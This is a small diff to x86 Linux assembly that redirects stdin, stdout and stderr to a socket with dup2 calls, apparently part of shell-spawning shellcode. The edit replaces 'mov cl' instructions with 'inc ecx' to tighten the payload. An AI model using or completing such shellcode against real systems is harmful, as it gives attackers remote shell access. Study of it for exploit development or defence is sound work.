@@ -84,10 +84,10 @@ redirect_fd:
 	mov ebx, edi		; sockfd
 	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
 	int 0x80		; call it
-	mov cl, 0x1		; 1 for std out
+	inc ecx			; 1 for std out
 	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
 	int 0x80		; call it
-	mov cl, 0x2		; 2 for std error
+	inc ecx			; 2 for std error
 	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
 	int 0x80		; call it
 
